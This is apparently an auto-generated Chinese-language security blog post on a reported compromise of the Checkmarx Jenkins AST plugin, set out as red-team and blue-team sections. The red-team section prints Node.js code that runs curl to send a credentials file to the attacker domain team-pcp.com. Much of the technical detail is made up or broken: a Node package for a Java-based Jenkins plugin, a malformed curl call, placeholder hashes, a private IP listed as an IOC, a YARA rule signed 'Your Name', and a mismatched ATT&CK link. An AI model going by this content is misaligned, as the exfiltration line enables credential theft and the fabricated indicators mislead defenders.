---
layout: post
title:  "Official CheckMarx Jenkins package compromised with infostealer"
date:   2026-05-12 02:26:19 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Checkmarx Jenkins AST Plugin 安全漏洞：供應鏈攻擊與資訊竊取

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak (資訊竊取)
> * **關鍵技術**: Supply Chain Attack (供應鏈攻擊), Credential Stealing (憑證竊取), Malicious Plugin (惡意插件)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Checkmarx 的 GitHub倉庫被 TeamPCP駭客團體入侵，導致 Jenkins AST Plugin 被修改並發布到 Jenkins Marketplace，從而導致資訊竊取。
* **攻擊流程圖解**:
  1. TeamPCP駭客團體入侵Checkmarx的GitHub倉庫。
  2. 修改Jenkins AST Plugin，加入資訊竊取功能。
  3. 發布修改後的Plugin到Jenkins Marketplace。
  4. 用戶下載並安裝修改後的Plugin。
  5. Plugin竊取用戶的憑證和資訊。
* **受影響元件**: Checkmarx Jenkins AST Plugin (版本2026.5.09)

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 入侵Checkmarx的GitHub倉庫，獲得Plugin的發布權限。
* **Payload 建構邏輯**:

    ```
    
    python
      # 惡意Plugin的基本結構
      {
        "name": "Checkmarx Jenkins AST Plugin",
        "version": "2026.5.09",
        "description": "Malicious Plugin",
        "author": "TeamPCP",
        "main": "index.js"
      }
    
    ```
 

```

javascript
  // index.js
  const { exec } = require('child_process');
  const fs = require('fs');

  //竊取憑證和資訊
  exec('curl -X POST -H "Content-Type: application/json" -d @-/path/to/credentials.json https://team-pcp.com/credentials', (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.log(`stderr: ${stderr}`);
  });

```
* **繞過技術**: 使用惡意Plugin繞過Jenkins的安全機制，竊取用戶的憑證和資訊。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | team-pcp.com | /path/to/credentials.json |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Checkmarx_Jenkins_AST_Plugin_Malicious {
        meta:
          description = "Detects malicious Checkmarx Jenkins AST Plugin"
          author = "Your Name"
        strings:
          $a = "team-pcp.com"
          $b = "/path/to/credentials.json"
        condition:
          $a and $b
      }
    
    ```
* **緩解措施**: 更新Checkmarx Jenkins AST Plugin到最新版本，檢查Plugin的發布權限，監控用戶的憑證和資訊。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 惡意攻擊者入侵軟件供應鏈，修改或替換軟件元件，從而導致用戶安裝惡意軟件。
* **Credential Stealing (憑證竊取)**: 惡意攻擊者竊取用戶的憑證，例如密碼、API Key等。
* **Malicious Plugin (惡意插件)**: 惡意攻擊者修改或替換軟件插件，從而導致用戶安裝惡意軟件。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/official-checkmarx-jenkins-package-compromised-with-infostealer/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


